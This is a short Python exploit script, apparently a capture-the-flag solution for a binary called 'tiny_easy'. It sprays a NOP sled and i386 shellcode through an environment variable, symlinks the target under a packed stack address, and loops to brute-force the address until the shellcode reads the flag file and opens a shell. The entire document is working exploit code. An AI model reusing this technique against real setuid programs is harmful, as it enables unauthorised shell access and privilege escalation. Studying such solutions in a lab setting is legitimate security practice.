from pwn import *
from subprocess import PIPE, Popen
import itertools, os

def run():
        count = 0
        i = 0
        while(True):
            payload  = p32(0xffdcfdd7)
            payload += "\x90" *  23337
            payload += asm(shellcraft.i386.linux.cat("/home/tiny_easy/flag"))
            payload += asm(shellcraft.i386.linux.sh())
            print "[+] Payload length: " + str(len(payload)) + "\n[+] Count: " + str(count)
            os.environ["PATH"] += ":/tmp/lolol"
            os.environ["XDG_SESSION_ID"] = payload
            os.system(p32(0xffdcfdd7) + " " + payload) 
            os.system("clear")
            count += 1

os.system("ulimit -s unlimited;")
try:
    os.symlink("/home/tiny_easy/tiny_easy", "/tmp/lolol/"+p32(0xffdcfdd7))
except:
    print "[+] Symlink to ~/tiny_easy was already created"
print "[+] Symlink to ~/tiny_easy is created"

run()